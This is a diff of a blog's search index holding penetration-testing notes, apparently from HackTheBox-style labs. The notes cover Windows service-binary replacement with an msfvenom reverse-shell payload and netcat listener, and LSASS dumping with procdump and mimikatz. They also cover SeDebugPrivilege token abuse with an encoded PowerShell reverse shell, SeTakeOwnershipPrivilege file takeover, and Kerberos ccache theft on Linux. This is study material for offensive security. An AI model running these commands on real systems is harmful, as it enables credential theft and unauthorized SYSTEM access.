-<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+<h4 id="Confirming-the-File-ACL-with-icacls"><a href="#Confirming-the-File-ACL-with-icacls" class="headerlink" title="Confirming the File ACL with icacls"></a>Confirming the File ACL with icacls</h4><blockquote>
+<p>➜ Both <code>BUILTIN\Users</code> and <code>Everyone</code> have <code>Full Access (F)</code> over the service binary, so we can modify or replace it.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files\service<span class="literal">-name</span>\service<span class="literal">-name</span>.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                               Everyone:(I)(F)</span><br><span class="line">                                               NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
+<p>➜ We check the service account with <code>sc qc</code>. </p>
+<ul>
+<li><code>SERVICE_START_NAME : LocalSystem</code> confirms our payload will run as <code>SYSTEM</code>.</li>
+</ul>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc service<span class="literal">-name</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: service<span class="literal">-name</span></span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
 
 
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Generating-the-Malicious-Binary"><a href="#Generating-the-Malicious-Binary" class="headerlink" title="Generating the Malicious Binary"></a>Generating the Malicious Binary</h4><blockquote>
+<p>➜ We craft a reverse-shell executable that connects back to our listener, we name it with the same target service binary so it overwrites the legitimate one.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-name.exe</span><br></pre></td></tr></table></figure>
 
-<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
-<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+<h4 id="Checking-If-We-Can-Start-And-Stop-the-Service"><a href="#Checking-If-We-Can-Start-And-Stop-the-Service" class="headerlink" title="Checking If We Can Start And Stop the Service"></a>Checking If We Can Start And Stop the Service</h4><blockquote>
+<p> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires <code>SERVICE_STOP</code> to stop it and <code>SERVICE_START</code> to start it again.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; .\accesschk.exe /accepteula -uvqc SecurityService</span><br><span class="line"></span><br><span class="line">SecurityService</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  R  NT AUTHORITY\INTERACTIVE</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  Everyone</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br></pre></td></tr></table></figure>
 
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
 
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+<h4 id="Stop-the-Service"><a href="#Stop-the-Service" class="headerlink" title="Stop the Service"></a>Stop the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> stop SecurityService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Replacing-the-Service-Binary"><a href="#Replacing-the-Service-Binary" class="headerlink" title="Replacing the Service Binary"></a>Replacing the Service Binary</h4><blockquote>
+<p>➜ The service is <code>Stopped</code>, so we can overwrite the file directly. </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; cmd /c <span class="built_in">copy</span> /Y SecurityService.exe <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> <span class="built_in">start</span> SecurityService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.X] 49xxx</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab Ccache Abuse</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Services</category>
       </categories>
       <tags>
-        <tag>klist</tag>
-        <tag>ccache</tag>
+        <tag>msfvenom</tag>
+        <tag>Weak-ACL</tag>
+        <tag>AccessChk</tag>
+        <tag>icacls</tag>
+        <tag>Permissive-File-System-ACLs</tag>
+        <tag>Modifiable-Service-Binary</tag>
+        <tag>Service-Binary-Replacement</tag>
+        <tag>SharpUp</tag>
+        <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
       </tags>
   </entry>
   <entry>
@@ -2311,9 +2436,9 @@
         <category>Credential Hunting</category>
       </categories>
       <tags>
+        <tag>Registry</tag>
         <tag>Credential-Hunting</tag>
         <tag>DPAPI</tag>
-        <tag>Registry</tag>
         <tag>KeePass</tag>
         <tag>mRemoteNG</tag>
         <tag>SharpChrome</tag>
@@ -2321,74 +2446,6 @@
         <tag>PowerShell-History</tag>
         <tag>Windows-Vaults</tag>
         <tag>Browser-Credentials</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Permissive File System ACLs</title>
-    <url>/2026/06/19/Permissive-File-System-ACLs/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Permissive File System ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically <code>SYSTEM</code>.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Modifiable-Service-Binaries"><a href="#Enumerating-Modifiable-Service-Binaries" class="headerlink" title="Enumerating Modifiable Service Binaries"></a>Enumerating Modifiable Service Binaries</h4><blockquote>
-<p>➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under <code>Modifiable Service Binaries</code>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : service<span class="literal">-name</span></span><br><span class="line">  DisplayName      : Service Display Name</span><br><span class="line">  Description      : Service description</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">  &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Confirming-the-File-ACL-with-icacls"><a href="#Confirming-the-File-ACL-with-icacls" class="headerlink" title="Confirming the File ACL with icacls"></a>Confirming the File ACL with icacls</h4><blockquote>
-<p>➜ Both <code>BUILTIN\Users</code> and <code>Everyone</code> have <code>Full Access (F)</code> over the service binary, so we can modify or replace it.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files\service<span class="literal">-name</span>\service<span class="literal">-name</span>.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                               Everyone:(I)(F)</span><br><span class="line">                                               NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
-<p>➜ We check the service account with <code>sc qc</code>. </p>
-<ul>
-<li><code>SERVICE_START_NAME : LocalSystem</code> confirms our payload will run as <code>SYSTEM</code>.</li>
-</ul>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc service<span class="literal">-name</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: service<span class="literal">-name</span></span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Generating-the-Malicious-Binary"><a href="#Generating-the-Malicious-Binary" class="headerlink" title="Generating the Malicious Binary"></a>Generating the Malicious Binary</h4><blockquote>
-<p>➜ We craft a reverse-shell executable that connects back to our listener, we name it with the same target service binary so it overwrites the legitimate one.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-name.exe</span><br></pre></td></tr></table></figure>
-
-<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-If-We-Can-Start-And-Stop-the-Service"><a href="#Checking-If-We-Can-Start-And-Stop-the-Service" class="headerlink" title="Checking If We Can Start And Stop the Service"></a>Checking If We Can Start And Stop the Service</h4><blockquote>
-<p> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires <code>SERVICE_STOP</code> to stop it and <code>SERVICE_START</code> to start it again.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; .\accesschk.exe /accepteula -uvqc SecurityService</span><br><span class="line"></span><br><span class="line">SecurityService</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  R  NT AUTHORITY\INTERACTIVE</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  Everyone</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Stop-the-Service"><a href="#Stop-the-Service" class="headerlink" title="Stop the Service"></a>Stop the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> stop SecurityService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Replacing-the-Service-Binary"><a href="#Replacing-the-Service-Binary" class="headerlink" title="Replacing the Service Binary"></a>Replacing the Service Binary</h4><blockquote>
-<p>➜ The service is <code>Stopped</code>, so we can overwrite the file directly. </p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; cmd /c <span class="built_in">copy</span> /Y SecurityService.exe <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> <span class="built_in">start</span> SecurityService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.X] 49xxx</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>Weak-ACL</tag>
-        <tag>AccessChk</tag>
-        <tag>msfvenom</tag>
-        <tag>icacls</tag>
-        <tag>Permissive-File-System-ACLs</tag>
-        <tag>Modifiable-Service-Binary</tag>
-        <tag>Service-Binary-Replacement</tag>
-        <tag>SharpUp</tag>
-        <tag>sc.exe</tag>
-        <tag>Windows-Services</tag>
       </tags>
   </entry>
   <entry>
@@ -2678,6 +2735,44 @@
       </tags>
   </entry>
   <entry>
+    <title>SeDebugPrivilege</title>
+    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+</blockquote>
+<blockquote>
+<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
+<ul>
+<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
+<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
+</ul>
+</blockquote>
+<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
+<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
+</blockquote>
+<p>Load Module Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Run Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Catch Shell As System  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
     <title>SeImpersonate and SeAssignPrimaryToken</title>
     <url>/2026/03/06/SeImpersonate-and-SeAssignPrimaryToken/</url>
     <content><![CDATA[<blockquote>
@@ -2711,35 +2806,58 @@
       </categories>
   </entry>
   <entry>
-    <title>SeDebugPrivilege</title>
-    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <title>SeTakeOwnershipPrivilege</title>
+    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
     <content><![CDATA[<blockquote>
-<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
 </blockquote>
-<blockquote>
-<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
 <ul>
-<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
-<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
+<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
 </ul>
+<blockquote>
+<p>➜ This can lead us to : </p>
 </blockquote>
-<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>Read protected files  </p>
+<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
+</li>
+<li><p>Privilege escalation &#x2F; RCE  </p>
+<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
+</li>
+<li><p>Denial of Service (DoS) </p>
+<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
+</li>
+<li><p>GPO → ownership abuse (domain)</p>
+<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
+</li>
+</ol>
+<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
 
-<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
-<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
 </blockquote>
-<p>Load Module Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
 
-<p>Run Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
 
 
-<p>Catch Shell As System  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+<blockquote>
+<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
+</blockquote>
+<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
+<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
